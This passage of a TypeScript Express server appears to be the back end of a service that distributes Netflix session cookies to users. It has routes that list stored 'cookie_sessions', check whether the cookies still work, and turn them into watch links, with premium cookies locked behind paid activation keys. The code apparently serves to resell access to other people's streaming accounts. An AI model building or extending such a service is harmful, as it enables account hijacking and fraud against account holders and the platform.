      return res.status(500).json({ message: "Invalid data format from database" });
    }

    const sessions = validated.data.map((session) => {
      if (session.is_premium && !userIsPremium) {
        return {
          ...session,
          is_premium: true,
          cookies: null,
        };
      }
      return session;
    });

    res.json({ sessions, userIsPremium });
  } catch (err: any) {
    log(`Supabase fetch error: ${err.message}`);
    res.status(500).json({ message: "Failed to connect to database" });
  }
});

app.post("/api/check", verifyAuth, async (req: Request, res: Response) => {
  try {
    const userIsPremium = (req as any).userIsPremium === true;

    const parsed = checkRequestSchema.safeParse(req.body);
    if (!parsed.success) {
      return res.status(400).json({ valid: false, error: "sessionId is required" });
    }

    const { sessionId } = parsed.data;

    let sessionRes = await supabaseRequest(`cookie_sessions?id=eq.${sessionId}&select=id,cookies,is_premium`);

    if (!sessionRes.ok) {
      const errText = await sessionRes.text();
      if (errText.includes("is_premium") && errText.includes("does not exist")) {
        sessionRes = await supabaseRequest(`cookie_sessions?id=eq.${sessionId}&select=id,cookies`);
        if (!sessionRes.ok) {
          return res.status(500).json({ valid: false, error: "Failed to fetch session" });
        }
      } else {
        return res.status(500).json({ valid: false, error: "Failed to fetch session" });
      }
    }

    const rows = await sessionRes.json();
    if (!rows.length) {
      return res.status(404).json({ valid: false, error: "Session not found" });
    }

    const session = rows[0];

    if (session.is_premium === true && !userIsPremium) {
      log(`Free user attempted to check premium cookie session ${sessionId}`);
      return res.status(403).json({
        valid: false,
        error: "Premium cookie — upgrade your activation key to access this session",
      });
    }

    const result = await validateNetflixCookies(session.cookies);
    res.json(result);
  } catch (err: any) {
    log(`Check error: ${err.message}`);
    res.status(500).json({ valid: false, error: "Failed to check cookie" });
  }
});

app.post("/api/watch", verifyAuth, async (req: Request, res: Response) => {
  try {
    const userIsPremium = (req as any).userIsPremium === true;
    const parsed = watchRequestSchema.safeParse(req.body);
    if (!parsed.success) {
      return res.status(400).json({ success: false, error: "sessionId is required" });
    }

    const { sessionId, target } = parsed.data;
    let sessionRes = await supabaseRequest(`cookie_sessions?id=eq.${sessionId}&select=id,cookies,is_premium`);

    if (!sessionRes.ok) {
      const errText = await sessionRes.text();
      if (errText.includes("is_premium") && errText.includes("does not exist")) {
        sessionRes = await supabaseRequest(`cookie_sessions?id=eq.${sessionId}&select=id,cookies`);
        if (!sessionRes.ok) {
          return res.status(500).json({ success: false, error: "Failed to fetch session" });
        }
      } else {
        return res.status(500).json({ success: false, error: "Failed to fetch session" });
      }
    }

    const rows = await sessionRes.json();
    if (!rows.length) {
      return res.status(404).json({ success: false, error: "Session not found" });
    }

    const session = rows[0];
    if (session.is_premium === true && !userIsPremium) {
      log(`Free user attempted to launch premium cookie session ${sessionId}`);
      return res.status(403).json({
        success: false,
        error: "Premium cookie — upgrade your activation key to access this session",
      });
    }

    const watchLink = await generateNetflixWatchLink(session.cookies, target);
    if (!watchLink) {
      return res.status(502).json({ success: false, error: "Watch link unavailable" });
    }

    res.json({ success: true, watchLink });
  } catch (err: any) {
    log(`Watch launch error: ${err.message}`);
    res.status(500).json({ success: false, error: "Failed to launch watch link" });
  }
});

// Global error handler
app.use((err: any, _req: Request, res: Response, next: NextFunction) => {
  const status = err.status || err.statusCode || 500;
  const message = err.message || "Internal Server Error";

  console.error("Internal Server Error:", err);

  if (res.headersSent) {
    return next(err);
  }

  return res.status(status).json({ message });
});

export default app;
